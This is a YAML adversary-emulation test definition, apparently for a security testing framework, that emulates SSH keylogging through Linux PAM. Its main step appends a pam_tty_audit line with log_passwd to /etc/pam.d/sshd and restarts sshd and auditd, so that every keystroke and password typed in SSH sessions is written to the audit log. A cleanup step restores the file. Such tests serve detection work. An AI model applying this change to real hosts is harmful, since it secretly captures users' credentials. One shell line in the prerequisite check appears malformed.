api_version: "2.0"
name: SSHD PAM keylogger
description: |
    Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.
args:
    - name: user_account
      type: string
      default: ubuntu
uuid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
mitre:
    tactics:
        - 'TA0009: Collection'
        - 'TA0006: Credential Access'
    techniques:
        - 'T1056: Input Capture'
    subtechniques:
        - 'T1056.001: Keylogging'
requirements:
    platforms:
        - os: linux
steps:
    - name: |
        This test requires sshd and auditd
      inline: |
        if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; {echo ""
        }; fi
        if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
      executor: sh
    - name: sshd-pam-keylogger
      inline: "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh {{.Args.user_account}}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
      executor: sh
      cleanup:
        inline: |
            cp -fv /tmp/sshd /etc/pam.d/
        executor: sh
